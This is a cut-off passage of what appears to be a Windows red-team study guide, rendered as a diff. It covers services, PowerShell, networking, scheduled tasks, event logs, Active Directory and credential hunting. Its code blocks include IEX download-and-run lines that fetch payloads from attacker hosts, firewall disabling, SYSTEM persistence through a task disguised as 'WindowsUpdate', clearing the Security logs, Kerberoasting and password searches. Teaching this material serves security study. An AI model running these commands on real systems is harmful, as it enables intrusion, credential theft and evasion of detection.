+      
+    
+
+      
+        <div class="block text-block"><p>Every running program is a process with a PID, a parent PID, an access token (identity), and memory space. Windows processes can spawn child processes — this parent-child relationship is a key signal in EDR detections (e.g., <code>winword.exe</code> spawning <code>powershell.exe</code> is almost always malware).</p>
+<p><strong>Process injection</strong> — attackers inject shellcode into legitimate processes to hide under trusted process names and inherit their tokens.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Services</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Services are long-running background processes managed by the <strong>Service Control Manager (SCM)</strong>, which itself runs as <code>services.exe</code>. Services can run as:<br>
+- <code>LocalSystem</code> (SYSTEM) — full OS privileges<br>
+- <code>LocalService</code> — reduced privileges, no network credentials<br>
+- <code>NetworkService</code> — reduced privileges with network identity<br>
+- A specific domain or local account</p>
+<p>Service configuration lives in the registry at <code>HKLM\SYSTEM\CurrentControlSet\Services\&lt;name&gt;</code>.</p>
+<p><strong>Service privesc vectors:</strong><br>
+1. <strong>Unquoted service path</strong> — if the path has spaces and isn't quoted, Windows tries each space-separated segment as an executable<br>
+2. <strong>Writable service binary</strong> — replace the exe with a payload<br>
+3. <strong>Writable service registry key</strong> — modify <code>ImagePath</code><br>
+4. <strong>Weak service permissions</strong> — <code>SERVICE_CHANGE_CONFIG</code> lets you change the binary path</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">powershell</span>
+            <span class="code-caption">Process and service enumeration</span>
+          </div>
+          <pre><code class="language-powershell"># Process list
+Get-Process
+Get-Process | Sort-Object CPU -Descending | Select -First 20
+Get-Process -Name lsass      # specific process
+Get-WmiObject Win32_Process | Select Name, ProcessId, ParentProcessId, CommandLine
+
+# CMD
+tasklist
+tasklist /v                  # verbose (includes username)
+tasklist /svc                # which services run in which svchost
+
+# Kill a process
+Stop-Process -Name notepad
+Stop-Process -Id 1234 -Force
+taskkill /PID 1234 /F
+
+# Services
+Get-Service
+Get-Service | Where-Object { $_.Status -eq &#39;Running&#39; }
+Get-Service -Name wuauserv | Select *
+sc query                     # CMD
+sc query type= all state= all
+
+# Start/stop services (requires admin)
+Start-Service -Name wuauserv
+Stop-Service  -Name wuauserv
+sc stop wuauserv
+sc start wuauserv
+
+# Service details via WMI
+Get-WmiObject Win32_Service | Select Name, PathName, StartName, State | Format-Table -AutoSize
+
+# Unquoted service paths (privesc check)
+Get-WmiObject Win32_Service | Where-Object {
+    $_.PathName -notlike &#39;&#34;*&#39; -and $_.PathName -like &#39;* *&#39;
+} | Select Name, PathName, StartName
+
+# Same with sc
+wmic service get name,displayname,pathname,startmode | 
+  findstr /i /v &#34;C:\Windows\\&#34; | findstr /i /v &#34;\&#34;&#34;
+
+# Check service binary ACLs
+Get-WmiObject Win32_Service | Select PathName | ForEach-Object {
+    $p = ($_.PathName -split &#39;&#34;&#39;)[1]
+    if ($p -and (Test-Path $p)) { icacls $p }
+}</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">07</span>
+            <span class="heading-text">CMD &amp; PowerShell</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">CMD (Command Prompt)</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><code>cmd.exe</code> is the legacy command interpreter. Limited scripting, no object pipeline. Still found everywhere and useful when PowerShell is restricted or monitored.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">PowerShell</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>PowerShell is a full scripting environment built on .NET. Unlike CMD, PowerShell works with <strong>.NET objects</strong> — you're not parsing text, you're passing structured data between cmdlets.</p>
+<p><strong>PowerShell execution policy</strong> — a speed bump, not a security boundary:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">Restricted   — no scripts (default on desktop)
+AllPolicy    — only signed scripts
+RemoteSigned — local scripts run; downloaded scripts need a signature
+Bypass       — nothing is blocked</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>It can always be bypassed:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">powershell</span>
+            
+          </div>
+          <pre><code class="language-powershell">powershell -ExecutionPolicy Bypass -File script.ps1
+powershell -ep bypass -c &#34;IEX(New-Object Net.WebClient).DownloadString(&#39;http://attacker/payload.ps1&#39;)&#34;</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>PowerShell logging</strong> — defenders enable:<br>
+- <strong>Script Block Logging</strong> — logs every script block executed (even obfuscated, after deobfuscation)<br>
+- <strong>Module Logging</strong> — logs module pipeline execution<br>
+- <strong>Transcription</strong> — full session transcript to file<br>
+- <strong>AMSI</strong> — Antimalware Scan Interface, scans script content before execution</p>
+<p>Knowing these exist shapes how attacks are detected and how defenders hunt.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">powershell</span>
+            <span class="code-caption">PowerShell essentials</span>
+          </div>
+          <pre><code class="language-powershell"># Help system
+Get-Help Get-Process
+Get-Help Get-Process -Examples
+Get-Command *user*       # find commands related to &#39;user&#39;
+Get-Command -Module ActiveDirectory
+
+# Variables
+$name = &#34;alice&#34;
+$ip   = &#34;10.10.10.5&#34;
+$list = @(&#34;one&#34;, &#34;two&#34;, &#34;three&#34;)
+$hash = @{ Name=&#34;alice&#34;; Age=30 }
+
+# Pipeline — pass objects, not text
+Get-Process | Where-Object { $_.CPU -gt 10 } | Select-Object Name, CPU, Id
+Get-Service | Where-Object { $_.Status -eq &#39;Running&#39; } | Select Name | Sort Name
+
+# Aliases (make it look like bash)
+ls    # = Get-ChildItem
+cat   # = Get-Content
+ps    # = Get-Process
+kill  # = Stop-Process
+echo  # = Write-Output
+
+# File operations
+Get-Content C:\Windows\System32\drivers\etc\hosts
+Set-Content C:\temp\file.txt &#34;hello&#34;
+Add-Content C:\temp\file.txt &#34;another line&#34;
+Copy-Item C:\temp\file.txt C:\temp\backup.txt
+Move-Item C:\temp\old.txt C:\temp\new.txt
+Remove-Item C:\temp\file.txt -Force
+New-Item -ItemType Directory C:\temp\newdir
+
+# Find files
+Get-ChildItem C:\ -Recurse -Filter &#34;*.config&#34; -ErrorAction SilentlyContinue
+Get-ChildItem C:\Users -Recurse -Include &#34;*.txt&#34;,&#34;*.xml&#34; -ErrorAction SilentlyContinue
+
+# Search file contents
+Select-String -Path C:\inetpub\wwwroot\* -Pattern &#34;password&#34; -Recurse
+Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue | 
+    Select-String &#34;password&#34; 2&gt;/dev/null
+
+# Download file (common payload staging)
+(New-Object Net.WebClient).DownloadFile(&#34;http://10.10.14.1/shell.exe&#34;, &#34;C:\temp\shell.exe&#34;)
+Invoke-WebRequest -Uri &#34;http://10.10.14.1/shell.exe&#34; -OutFile &#34;C:\temp\shell.exe&#34;
+
+# Execute downloaded script in memory (fileless)
+IEX (New-Object Net.WebClient).DownloadString(&#34;http://10.10.14.1/PowerView.ps1&#34;)
+
+# Base64 encode a command (bypass some filters)
+$cmd = &#34;Write-Host &#39;hello&#39;&#34;
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+$b64 = [Convert]::ToBase64String($bytes)
+powershell -EncodedCommand $b64
+
+# WMI — query and execute
+Get-WmiObject Win32_OperatingSystem
+Get-WmiObject Win32_ComputerSystem
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &#34;cmd.exe&#34;</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">08</span>
+            <span class="heading-text">Networking</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Windows networking from the command line — essential for recon after landing on a box, setting up pivots, and understanding what's accessible.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">powershell</span>
+            <span class="code-caption">Network enumeration from a Windows shell</span>
+          </div>
+          <pre><code class="language-powershell"># Interface info and IP addresses
+ipconfig /all
+Get-NetIPAddress
+Get-NetAdapter
+
+# Routing table
+route print
+Get-NetRoute
+
+# DNS
+ipconfig /displaydns          # DNS cache (reveals internal hostnames)
+nslookup internal.corp
+Resolve-DnsName internal.corp
+type C:\Windows\System32\drivers\etc\hosts   # local overrides
+
+# Active connections and listening ports
+netstat -ano                  # all connections with PID
+netstat -ano | findstr LISTEN
+netstat -ano | findstr :445
+Get-NetTCPConnection | Where State -eq Listen | Select LocalAddress,LocalPort,OwningProcess
+Get-NetTCPConnection | Sort OwningProcess
+
+# Map PID to process name
+Get-Process -Id (Get-NetTCPConnection -LocalPort 80).OwningProcess
+
+# Firewall
+netsh advfirewall show allprofiles
+Get-NetFirewallRule | Where { $_.Enabled -eq &#39;True&#39; } | 
+    Select DisplayName, Direction, Action | Format-Table
+
+# Disable firewall (if admin)
+netsh advfirewall set allprofiles state off
+Set-NetFirewallProfile -All -Enabled False
+
+# ARP cache (reveals hosts on the local segment)
+arp -a
+Get-NetNeighbor
+
+# Shares
+net share
+Get-SmbShare
+Get-SmbConnection
+
+# Enumerate accessible shares on a remote host
+net view \\10.10.10.5
+Get-SmbShare -CimSession 10.10.10.5
+
+# Map a network drive
+net use Z: \\10.10.10.5\C$ /user:Administrator password
+New-PSDrive -Name Z -PSProvider FileSystem -Root \\10.10.10.5\C$ -Credential (Get-Credential)
+
+# Test connectivity
+Test-NetConnection 10.10.10.5 -Port 445
+Test-NetConnection 10.10.10.5 -Port 3389
+ping 10.10.10.5
+
+# Port scan from PowerShell (no tools)
+1..1000 | ForEach-Object {
+    $port = $_
+    $tcp = New-Object Net.Sockets.TcpClient
+    try {
+        $tcp.Connect(&#34;10.10.10.5&#34;, $port)
+        Write-Host &#34;$port OPEN&#34;
+        $tcp.Close()
+    } catch {}
+}</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">09</span>
+            <span class="heading-text">Scheduled Tasks</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Scheduled Tasks</strong> are Windows' equivalent of cron — they execute programs on a schedule, at boot, at login, or on system events. Like cron, they're a primary <strong>persistence</strong> and <strong>privilege escalation</strong> vector.</p>
+<p>Tasks are stored as XML files in <code>C:\Windows\System32\Tasks\</code> and older <code>.job</code> files in <code>C:\Windows\SysWOW64\Tasks\</code>.</p>
+<p><strong>Attack scenarios:</strong><br>
+- Find a task running as SYSTEM that calls a writable script → overwrite it<br>
+- Find a task calling a binary in a writable directory → DLL hijack or binary replacement<br>
+- Create a scheduled task for persistence (survives reboots, hides in task list)</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">powershell</span>
+            <span class="code-caption">Scheduled tasks — enumeration and abuse</span>
+          </div>
+          <pre><code class="language-powershell"># List all scheduled tasks
+Get-ScheduledTask
+Get-ScheduledTask | Select TaskName, TaskPath, State
+schtasks /query /fo LIST /v
+schtasks /query /fo TABLE
+
+# Detailed info on a specific task
+Get-ScheduledTask -TaskName &#34;MyTask&#34; | Get-ScheduledTaskInfo
+(Get-ScheduledTask -TaskName &#34;MyTask&#34;).Actions
+(Get-ScheduledTask -TaskName &#34;MyTask&#34;).Triggers
+(Get-ScheduledTask -TaskName &#34;MyTask&#34;).Principal   # what user it runs as
+
+# Find tasks running as SYSTEM with writable action path
+Get-ScheduledTask | ForEach-Object {
+    $task = $_
+    $task.Actions | ForEach-Object {
+        if ($_.Execute -and (Test-Path $_.Execute -ErrorAction SilentlyContinue)) {
+            $acl = Get-Acl $_.Execute -ErrorAction SilentlyContinue
+            $acl.Access | Where-Object {
+                $_.FileSystemRights -match &#39;Write|FullControl&#39; -and
+                $_.IdentityReference -notmatch &#39;SYSTEM|Administrators&#39;
+            } | ForEach-Object {
+                &#34;WRITABLE: $($task.TaskName) -&gt; $($_.Execute)&#34;
+            }
+        }
+    }
+}
+
+# Create a scheduled task (persistence)
+$action  = New-ScheduledTaskAction -Execute &#34;C:\temp\payload.exe&#34;
+$trigger = New-ScheduledTaskTrigger -AtLogon
+$principal = New-ScheduledTaskPrincipal -UserId SYSTEM -RunLevel Highest
+Register-ScheduledTask -TaskName &#34;WindowsUpdate&#34; -Action $action -Trigger $trigger -Principal $principal
+
+# CMD — create task (persistence, runs at startup as SYSTEM)
+schtasks /create /tn &#34;WindowsUpdate&#34; /tr &#34;C:\temp\payload.exe&#34; /sc onstart /ru SYSTEM /f
+
+# Delete a task
+Unregister-ScheduledTask -TaskName &#34;WindowsUpdate&#34; -Confirm:$false
+schtasks /delete /tn &#34;WindowsUpdate&#34; /f
+
+# Task XML files — examine directly
+Get-Content &#34;C:\Windows\System32\Tasks\Microsoft\Windows\MyTask&#34;</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">10</span>
+            <span class="heading-text">Event Logs</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Windows Event Logs are the primary forensic source on a Windows box. Understanding what gets logged — and where — is essential for both detecting attacks and avoiding detection.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Key Logs and Event IDs</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Log</th><th>Location</th><th>Key Event IDs</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>**Security**</td><td>`Security`</td><td>Logins, privilege use, object access, policy changes</td>
+                </tr>
+              
+                <tr>
+                  <td>**System**</td><td>`System`</td><td>Service start/stop, driver loads, OS events</td>
+                </tr>
+              
+                <tr>
+                  <td>**Application**</td><td>`Application`</td><td>App errors, installer events</td>
+                </tr>
+              
+                <tr>
+                  <td>**PowerShell**</td><td>`Microsoft-Windows-PowerShell/Operational`</td><td>Script blocks, remoting</td>
+                </tr>
+              
+                <tr>
+                  <td>**Sysmon**</td><td>`Microsoft-Windows-Sysmon/Operational`</td><td>Process create, network, registry (if installed)</td>
+                </tr>
+              
+                <tr>
+                  <td>**WinRM**</td><td>`Microsoft-Windows-WinRM/Operational`</td><td>Remote PS connections</td>
+                </tr>
+              
+                <tr>
+                  <td>**RDP**</td><td>`Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational`</td><td>RDP connections</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Critical Security Event IDs:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Event ID</th><th>Meaning</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>4624</td><td>Successful logon</td>
+                </tr>
+              
+                <tr>
+                  <td>4625</td><td>Failed logon</td>
+                </tr>
+              
+                <tr>
+                  <td>4634 / 4647</td><td>Logoff</td>
+                </tr>
+              
+                <tr>
+                  <td>4648</td><td>Logon with explicit credentials (runas, pass-the-hash)</td>
+                </tr>
+              
+                <tr>
+                  <td>4672</td><td>Special privileges assigned at logon (admin token)</td>
+                </tr>
+              
+                <tr>
+                  <td>4688</td><td>Process creation (if enabled — shows command line)</td>
+                </tr>
+              
+                <tr>
+                  <td>4698</td><td>Scheduled task created</td>
+                </tr>
+              
+                <tr>
+                  <td>4702</td><td>Scheduled task modified</td>
+                </tr>
+              
+                <tr>
+                  <td>4720</td><td>User account created</td>
+                </tr>
+              
+                <tr>
+                  <td>4732</td><td>User added to a security-enabled local group</td>
+                </tr>
+              
+                <tr>
+                  <td>4756</td><td>User added to a universal security group</td>
+                </tr>
+              
+                <tr>
+                  <td>7045</td><td>New service installed</td>
+                </tr>
+              
+                <tr>
+                  <td>4776</td><td>NTLM credential validation (DC)</td>
+                </tr>
+              
+                <tr>
+                  <td>4768</td><td>Kerberos TGT requested</td>
+                </tr>
+              
+                <tr>
+                  <td>4769</td><td>Kerberos service ticket requested</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Logon types</strong> (field in 4624/4625):</p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Type</th><th>Meaning</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>2</td><td>Interactive (console login)</td>
+                </tr>
+              
+                <tr>
+                  <td>3</td><td>Network (SMB, net use)</td>
+                </tr>
+              
+                <tr>
+                  <td>4</td><td>Batch (scheduled task)</td>
+                </tr>
+              
+                <tr>
+                  <td>5</td><td>Service</td>
+                </tr>
+              
+                <tr>
+                  <td>7</td><td>Unlock</td>
+                </tr>
+              
+                <tr>
+                  <td>8</td><td>NetworkCleartext (IIS basic auth)</td>
+                </tr>
+              
+                <tr>
+                  <td>10</td><td>RemoteInteractive (RDP)</td>
+                </tr>
+              
+                <tr>
+                  <td>11</td><td>CachedInteractive (cached domain creds)</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">powershell</span>
+            <span class="code-caption">Event log analysis</span>
+          </div>
+          <pre><code class="language-powershell"># List available event logs
+Get-EventLog -List
+Get-WinEvent -ListLog * | Select LogName, RecordCount | Sort RecordCount -Descending
+
+# Read the Security log
+Get-EventLog -LogName Security -Newest 50
+Get-WinEvent -LogName Security -MaxEvents 100
+
+# Filter by Event ID
+Get-WinEvent -FilterHashtable @{ LogName=&#39;Security&#39;; Id=4625 } -MaxEvents 50   # failed logons
+Get-WinEvent -FilterHashtable @{ LogName=&#39;Security&#39;; Id=4624 } -MaxEvents 50   # successful logons
+Get-WinEvent -FilterHashtable @{ LogName=&#39;System&#39;;   Id=7045 } -MaxEvents 20   # new services
+
+# Filter by time
+Get-WinEvent -FilterHashtable @{
+    LogName=&#39;Security&#39;
+    Id=4624
+    StartTime=(Get-Date).AddHours(-1)
+} | Select TimeCreated, Message
+
+# Parse event message fields
+Get-WinEvent -FilterHashtable @{ LogName=&#39;Security&#39;; Id=4624 } -MaxEvents 10 | ForEach-Object {
+    $xml = [xml]$_.ToXml()
+    $data = $xml.Event.EventData.Data
+    [PSCustomObject]@{
+        Time     = $_.TimeCreated
+        User     = ($data | Where Name -eq &#39;TargetUserName&#39;).&#39;#text&#39;
+        LogonType= ($data | Where Name -eq &#39;LogonType&#39;).&#39;#text&#39;
+        IP       = ($data | Where Name -eq &#39;IpAddress&#39;).&#39;#text&#39;
+    }
+}
+
+# Check PowerShell script block logs (defenders hunt here)
+Get-WinEvent -LogName &#34;Microsoft-Windows-PowerShell/Operational&#34; -MaxEvents 50
+Get-WinEvent -FilterHashtable @{ LogName=&#39;Microsoft-Windows-PowerShell/Operational&#39;; Id=4104 }
+
+# Clear event logs (anti-forensics — very noisy, triggers ID 1102)
+wevtutil cl Security
+wevtutil cl System
+Clear-EventLog -LogName Security
+
+# CMD
+wevtutil qe Security /c:10 /rd:true /f:text
+wevtutil qe Security /q:&#34;*[System[EventID=4625]]&#34; /c:50 /f:text</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">11</span>
+            <span class="heading-text">Active Directory Fundamentals</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Active Directory (AD)</strong> is the directory service used by virtually every enterprise Windows network. It centralises authentication and authorisation across the domain. Understanding AD is mandatory for any enterprise red team or blue team work.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Core Concepts</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Domain</strong> — a logical grouping of objects (users, computers, groups) that share a common database and security policy. Identified by a DNS name, e.g. <code>corp.local</code>.</p>
+<p><strong>Domain Controller (DC)</strong> — a server running Active Directory Domain Services (AD DS). Authenticates users, enforces policy, and holds the AD database (<code>NTDS.dit</code>).</p>
+<p><strong>Forest</strong> — one or more domains with trust relationships, sharing a schema and global catalog.</p>
+<p><strong>Organisational Units (OUs)</strong> — containers within a domain for organising objects and applying Group Policy.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Key Objects</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Object</th><th>Description</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>**User**</td><td>Has a SAMAccountName, UPN, SID, password hash in NTDS</td>
+                </tr>
+              
+                <tr>
+                  <td>**Computer**</td><td>Machine account — ends in `$` (e.g. `WORKSTATION01$`)</td>
+                </tr>
+              
+                <tr>
+                  <td>**Group**</td><td>Security group (for ACLs) or Distribution group (email)</td>
+                </tr>
+              
+                <tr>
+                  <td>**Group Policy Object (GPO)**</td><td>Policy applied to OUs — controls settings for all objects within</td>
+                </tr>
+              
+                <tr>
+                  <td>**Service Principal Name (SPN)**</td><td>Identifier for a service instance — used by Kerberos</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Authentication: NTLM vs Kerberos</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>NTLM</strong> (challenge-response):<br>
+1. Client → Server: NEGOTIATE<br>
+2. Server → Client: CHALLENGE (nonce)<br>
+3. Client → Server: AUTHENTICATE (hash of nonce + password hash)</p>
+<p>NTLM hashes can be captured (Responder) and cracked offline, or used directly in <strong>Pass-the-Hash</strong> attacks.</p>
+<p><strong>Kerberos</strong> (ticket-based, preferred in AD):<br>
+1. Client → KDC (DC): AS-REQ — <code>"I am Alice, give me a TGT"</code><br>
+2. KDC → Client: AS-REP — TGT encrypted with <code>krbtgt</code> hash<br>
+3. Client → KDC: TGS-REQ — <code>"I need a ticket for service X"</code> (presents TGT)<br>
+4. KDC → Client: TGS-REP — service ticket encrypted with service account's hash<br>
+5. Client → Service: AP-REQ — presents service ticket</p>
+<p><strong>Attack surface on Kerberos:</strong><br>
+- <strong>Kerberoasting</strong> — any domain user can request a service ticket for any SPN. The ticket is encrypted with the service account's hash → crack offline<br>
+- <strong>AS-REP Roasting</strong> — accounts with <code>DONT_REQUIRE_PREAUTH</code> set return an AS-REP that contains encrypted data → crack offline without any credentials<br>
+- <strong>Pass-the-Ticket</strong> — inject a Kerberos ticket into your session<br>
+- <strong>Golden Ticket</strong> — forge a TGT using the <code>krbtgt</code> hash → impersonate any user forever<br>
+- <strong>Silver Ticket</strong> — forge a service ticket using the service account hash</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">powershell</span>
+            <span class="code-caption">Active Directory enumeration</span>
+          </div>
+          <pre><code class="language-powershell"># ── Built-in AD cmdlets (requires RSAT) ───────────────────────────────────────
+Import-Module ActiveDirectory
+
+# Domain info
+Get-ADDomain
+Get-ADForest
+
+# Users
+Get-ADUser -Filter * -Properties *
+Get-ADUser -Filter * | Select SamAccountName, Enabled, LastLogonDate
+Get-ADUser -Identity alice -Properties *
+
+# Find users with DONT_REQUIRE_PREAUTH (AS-REP Roast targets)
+Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth
+
+# Find users with SPN set (Kerberoast targets)
+Get-ADUser -Filter { ServicePrincipalName -ne &#34;$null&#34; } -Properties ServicePrincipalName |
+    Select SamAccountName, ServicePrincipalName
+
+# Groups
+Get-ADGroup -Filter *
+Get-ADGroupMember -Identity &#34;Domain Admins&#34;
+Get-ADGroupMember -Identity &#34;Domain Admins&#34; -Recursive
+
+# Computers
+Get-ADComputer -Filter * | Select Name, OperatingSystem, LastLogonDate
+
+# Domain Controllers
+Get-ADDomainController -Filter *
+
+# Password policy
+Get-ADDefaultDomainPasswordPolicy
+
+# GPOs
+Get-GPO -All
+Get-GPOReport -All -ReportType HTML -Path C:\temp\gpo_report.html
+
+# ── PowerView (BloodHound / PowerSploit) ──────────────────────────────────────
+# Load PowerView
+IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.1/PowerView.ps1&#39;)
+
+# Domain info
+Get-NetDomain
+Get-NetDomainController
+
+# Users
+Get-NetUser
+Get-NetUser -Username alice
+Get-NetUser | Select samaccountname, description   # descriptions often contain passwords!
+
+# Find admin users
+Get-NetGroupMember -GroupName &#34;Domain Admins&#34;
+Get-NetGroupMember -GroupName &#34;Enterprise Admins&#34;
+
+# Find computers with unconstrained delegation
+Get-NetComputer -Unconstrained
+
+# Find local admin access across domain
+Find-LocalAdminAccess   # tests which machines your account is local admin on
+
+# ACL hunting — who has dangerous rights on what
+Find-InterestingDomainAcl | Select ObjectDN, ActiveDirectoryRights, IdentityReferenceName
+
+# ── Kerberoasting ────────────────────────────────────────────────────────────
+# With PowerView
+Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv kerb_hashes.csv
+
+# With Rubeus
+.\Rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt
+
+# With impacket (from Linux)
+GetUserSPNs.py corp.local/alice:password -dc-ip 10.10.10.100 -request
+
+# Crack the hashes
+hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
+
+# ── AS-REP Roasting ──────────────────────────────────────────────────────────
+# With impacket
+GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -no-pass -dc-ip 10.10.10.100
+hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">12</span>
+            <span class="heading-text">Credential Harvesting</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Windows stores credentials in many places. Knowing where to look is a core skill.</p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Location</th><th>Credentials stored</th><th>How to access</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>**lsass.exe memory**</td><td>NTLM hashes, Kerberos tickets, plaintext (WDigest)</td><td>Mimikatz, pypykatz, Task Manager dump</td>
+                </tr>
+              
+                <tr>
+                  <td>**SAM database**</td><td>Local account NTLM hashes</td><td>reg save or VSS, then secretsdump</td>
+                </tr>
+              
+                <tr>
+                  <td>**NTDS.dit (DC)**</td><td>All domain account hashes</td><td>DCSync, VSS copy, ntdsutil</td>
+                </tr>
+              
+                <tr>
+                  <td>**LSA Secrets**</td><td>Service account creds, cached domain creds</td><td>secretsdump, Mimikatz</td>
+                </tr>
+              
+                <tr>
+                  <td>**DPAPI**</td><td>Browser passwords, WiFi keys, certificates</td><td>Mimikatz, SharpDPAPI</td>
+                </tr>
+              
+                <tr>
+                  <td>**Credential Manager**</td><td>Windows Vault — saved network/web creds</td><td>cmdkey /list, Mimikatz</td>
+                </tr>
+              
+                <tr>
+                  <td>**Registry**</td><td>Sometimes hardcoded by sysadmins</td><td>reg query</td>
+                </tr>
+              
+                <tr>
+                  <td>**Config files**</td><td>Web.config, application.config, .env</td><td>filesystem search</td>
+                </tr>
+              
+                <tr>
+                  <td>**Browser storage**</td><td>Chrome/Firefox saved passwords (DPAPI)</td><td>SharpChrome, LaZagne</td>
+                </tr>
+              
+                <tr>
+                  <td>**PowerShell history**</td><td>Commands run in previous sessions</td><td>`%APPDATA%\..\PSReadLine\ConsoleHost_history.txt`</td>
+                </tr>
+              
+                <tr>
+                  <td>**Memory strings**</td><td>Passwords typed in cleartext</td><td>procdump + strings</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">powershell</span>
+            <span class="code-caption">Credential hunting on a Windows host</span>
+          </div>
+          <pre><code class="language-powershell"># PowerShell history — frequently contains credentials
+Get-Content &#34;$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&#34;
+Get-Content (Get-PSReadlineOption).HistorySavePath
+
+# Credential Manager
+cmdkey /list
+# Extract with Mimikatz:
+# vault::cred
+
+# Find config files with passwords
+Get-ChildItem C:\ -Recurse -Include *.xml,*.config,*.ini,*.conf,*.txt -ErrorAction SilentlyContinue |
+    Select-String -Pattern &#34;password|passwd|pwd|secret|credential&#34; -ErrorAction SilentlyContinue
+
+# Web.config files (IIS / .NET applications)
+Get-ChildItem C:\inetpub -Recurse -Filter web.config | 
+    Get-Content | Select-String -Pattern &#34;password|connectionString&#34;
+
+# Unattend.xml / Sysprep — hardcoded creds from deployment
